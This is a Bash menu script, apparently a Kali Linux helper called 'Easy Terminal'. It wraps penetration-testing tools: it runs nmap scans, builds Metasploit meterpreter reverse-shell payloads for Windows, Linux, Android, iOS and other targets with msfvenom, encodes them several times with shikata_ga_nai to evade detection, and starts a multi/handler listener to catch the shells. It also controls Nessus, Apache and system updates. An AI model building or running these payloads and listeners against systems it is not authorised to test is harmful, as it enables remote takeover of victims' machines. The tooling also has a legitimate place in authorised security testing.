#!/bin/sh

# Define Colors
cyan='\e[0;36m'
Blue2='\e[0;34m'
okegreen='\033[92m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
orange='\e[0;33m'

print_menu() {
    echo $Blue2"========================================================================="
    figlet "Easy Terminal" | lolcat
    echo " [---] Welcome to Easy Terminal by: [---]"
    figlet "BO7MED MIX YT" | lolcat
    echo $Blue2"========================================================================="
    echo 
    echo $red "==============================" $red "=============================="
    echo $red "[1]. Start Nmap Scan          " $red "[2]. Create Payload           "
    echo $red "==============================" $red "=============================="
    echo $cyan "==============================" $cyan "=============================="
    echo $cyan "[3]. Create Metasploit Listener" $cyan"[4]. Start Nessus             "
    echo $cyan "==============================" $cyan "=============================="
    echo $okegreen  "==============================" $okegreen "=============================="
    echo $okegreen  "[5]. Start Apache2            " $okegreen "[6]. Stop Apache2             "
    echo $okegreen  "==============================" $okegreen "=============================="
    echo $yellow "=============================="  $yellow "=============================="
    echo $yellow "[7]. Update & Upgrade System  "  $yellow "[8]. Remove Old Files         "
    echo $yellow "=============================="  $yellow "=============================="
    echo $white "==============================" $white "=============================="
    echo $white "[9]. Update Script            " $white "[10]. Exit                    "
    echo $white "==============================" $white "=============================="
}

show_ip_addresses() {
    echo "========================================================================="
    echo "IPv4 and IPv6 Addresses"
    echo "========================================================================="
    echo "IPv4 Addresses:"
    ip -4 addr show | grep inet | awk '{print $2}'
    echo ""
    echo "IPv6 Addresses:"
    ip -6 addr show | grep inet6 | awk '{print $2}'
    echo "========================================================================="
}



update_script() {
    script_dir="/home/kali/easy-terminal-script"
    repo_url="https://github.com/DevBO7MED/easy-terminal-script"
    required_files="README.md LICENSE install.sh"

    echo "Updating repository in script directory $script_dir..."
    cd $script_dir || { echo "Failed to change directory to $script_dir"; exit 1; }

    # Fetch the latest changes from the remote repository
    git fetch --quiet

    # Check for updates by comparing local and remote branches
    local_changes=$(git status --porcelain)
    if [ -n "$local_changes" ]; then
        echo "Local changes detected. Resetting to the latest commit..."
        git reset --hard HEAD
    fi

    echo "Pulling latest changes..."
    git pull --force $repo_url main

    # Check for missing files after pulling
    missing_files=""
    for file in $required_files; do
        if [ ! -f "$script_dir/$file" ]; then
            missing_files="$missing_files $file"
        fi
    done

    if [ -n "$missing_files" ]; then
        echo "The following required files are missing: $missing_files"
        echo "Attempting to restore missing files..."
        git checkout HEAD -- $missing_files
        if [ $? -eq 0 ]; then
            echo "Missing files restored successfully!"
        else
            echo "Failed to restore missing files. Please check manually."
        fi
    else
        echo "All required files are present."
    fi

    echo "Press [ENTER] to return to the menu."
    read cont
    clear
}



nmap_options() {
    echo ""
    echo -e $orange "  +------------------------------------------+"
    echo -e $orange "  |$white [1] $yellow Basic Scan$orange                      |"
    echo -e $orange "  |$white [2] $yellow Version Detection$orange               |"
    echo -e $orange "  |$white [3] $yellow OS Detection$orange                      |"
    echo -e $orange "  |$white [4] $yellow All Scan$orange                        |"
    echo -e $orange "  +------------------------------------------+"
    echo ""
    echo -ne $okegreen "  Choose Scan Type: ";tput sgr0
    read scan_type

    case $scan_type in
        1)
            scan_args="-sS -O -Pn -sV -p-"
            ;;
        2)
            scan_args="-sV"
            ;;
        3)
            scan_args="-O"
            ;;
        4)
            scan_args="-sS -O -Pn -sV -p-"
            ;;
        *)
            echo ""
            echo -e $red "Invalid option, choose between 1 and 4"
            nmap_options
            ;;
    esac
}

payload_option() {
    echo ""
    echo -e $orange "  +------------------------------------------+"
    echo -e $orange "  |$white [1] $yellow windows/meterpreter/reverse_tcp$orange   |"
    echo -e $orange "  |$white [2] $yellow windows/meterpreter/reverse_http$orange  |"
    echo -e $orange "  |$white [3] $yellow windows/meterpreter/reverse_https$orange |"
    echo -e $orange "  |$white [4] $yellow linux/x86/meterpreter/reverse_tcp$orange  |"
    echo -e $orange "  |$white [5] $yellow linux/x64/meterpreter/reverse_tcp$orange  |"
    echo -e $orange "  |$white [6] $yellow php/meterpreter/reverse_tcp$orange       |"
    echo -e $orange "  |$white [7] $yellow python/meterpreter/reverse_tcp$orange    |"
    echo -e $orange "  |$white [8] $yellow android/meterpreter/reverse_tcp$orange   |"
    echo -e $orange "  |$white [9] $yellow ios/meterpreter/reverse_tcp$orange       |"
    echo -e $orange "  |$white [10]$yellow unix/meterpreter/reverse_tcp$orange      |"
    echo -e $orange "  +------------------------------------------+"
    echo ""
    echo -ne $okegreen "  Choose Payload Type: ";tput sgr0
    read payload_type

    case $payload_type in
        1)
            export PAYLOAD_TYPE="windows/meterpreter/reverse_tcp"
            ;;
        2)
            export PAYLOAD_TYPE="windows/meterpreter/reverse_http"
            ;;
        3)
            export PAYLOAD_TYPE="windows/meterpreter/reverse_https"
            ;;
        4)
            export PAYLOAD_TYPE="linux/x86/meterpreter/reverse_tcp"
            ;;
        5)
            export PAYLOAD_TYPE="linux/x64/meterpreter/reverse_tcp"
            ;;
        6)
            export PAYLOAD_TYPE="php/meterpreter/reverse_tcp"
            ;;
        7)
            export PAYLOAD_TYPE="python/meterpreter/reverse_tcp"
            ;;
        8)
            export PAYLOAD_TYPE="android/meterpreter/reverse_tcp"
            ;;
        9)
            export PAYLOAD_TYPE="ios/meterpreter/reverse_tcp"
            ;;
        10)
            export PAYLOAD_TYPE="unix/meterpreter/reverse_tcp"
            ;;
        *)
            echo ""
            echo -e $red "Invalid option, choose between 1 and 10"
            payload_option
            ;;
    esac
}

execute_option() {
    case $1 in
        1)  
            echo
            nmap_options
            echo
            read -p "Enter Target IP or URL: " IP
            sudo nmap $scan_args $IP
            echo
            echo $okegreen"Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        2)  
            echo
            payload_option
            echo
            read -p "Enter LHOST \"IP\" (e.g., \"192.168.1.5\"): " lhost
            echo
            read -p "Enter LPORT \"Port\" (e.g., \"4444\"): " lport
            read -p "Enter Payload save path (e.g., \"/home/kali\"): " P
            echo
            read -p "Enter Payload name (e.g., \"Payload.exe\"): " N
            echo
            read -p "Enter Platform Name (e.g., \"Windows\") " platform1
            echo
            read -p "Enter 86 or 64 Bit (e.g., \"x86\") " platform2
            echo
            echo "Creating Payload..."
            echo
            msfvenom -p $PAYLOAD_TYPE LHOST=$lhost LPORT=$lport --platform $platform1 -a $platform2 -f exe -e x86/shikata_ga_nai -i 5 -o $P/$N
            if [ $? -eq 0 ]; then
                echo "Payload created successfully!"
            else
                echo "Error: invalid payload."
            fi
            echo
            echo "Payload Path: $P/$N"
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        3)  
            echo
            payload_option
            echo
            read -p "Enter LHOST \"IP\" (e.g., \"192.168.1.5\"): " LHOST
            echo
            read -p "Enter LPORT \"Port\" (e.g., \"4444\"): " LPORT
            echo
            xterm -e bash -c "echo 'Starting Metasploit Listener...'; sudo service metasploit start; msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST $LHOST; set LPORT $LPORT; exploit'" &
            clear
            ;;
        4)  
            echo
            sudo service nessusd start
            echo "Opening Nessus Web Interface..."
            xdg-open http://localhost:8834
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        5)  
            echo
            echo "Starting Apache2..."
            sudo service apache2 start
            echo "Apache2 started."
            echo
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        6)  
            echo
            echo "Stopping Apache2..."
            sudo service apache2 stop
            echo "Apache2 stopped."
            echo
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        7)  
            echo
            echo "Updating and Upgrading System..."
            sudo apt-get update && sudo apt-get upgrade -y
            echo "System updated and upgraded."
            echo
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        8)  
            echo
            echo "Removing old system files..."
            echo
            sudo apt-get autoremove -y
            echo
            echo "Old files removed."
            echo
            echo "Press [ENTER] to return to the menu."
            read cont
            clear
            ;;
        9)  
            update_script
            ;;
        10) 
            echo "Exiting..."
            exit
            ;;
        *)
            echo ""
            echo -e $red "Invalid option, choose between 1 and 10"
            ;;
    esac
}

while true; do
    clear
    print_menu
    echo
    echo $okegreen"┌─["$red"Easy Terminal$okegreen]──[$red~$okegreen]─["$yellow"Menu$okegreen]:"
    read -p "└─────► " choice
    execute_option $choice
done
